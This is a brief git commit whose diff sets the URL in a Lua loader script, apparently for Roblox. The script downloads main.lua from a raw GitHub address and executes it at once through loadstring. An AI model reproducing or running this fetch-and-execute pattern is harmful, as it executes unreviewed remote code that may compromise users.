610a7bb8bf2d504c53676fe98f8a79a97dbe5cb9
2xc3 <fr13ndxdxdxd@gmail.com>
2026-06-25 21:19:59 +0200

    link

--- loader.lua
+++ loader.lua
@@ -1,5 +1,5 @@
 --!grant RuntimeLoadstring
 rbxcli.loadstring(game:GetService("HttpService"):RequestAsync({
     Method = "GET",
-    Url = ""
+    Url = "https://raw.githubusercontent.com/abvcghsdcxy/omg6767676767676767/refs/heads/main/main.lua"
 }).Body)()
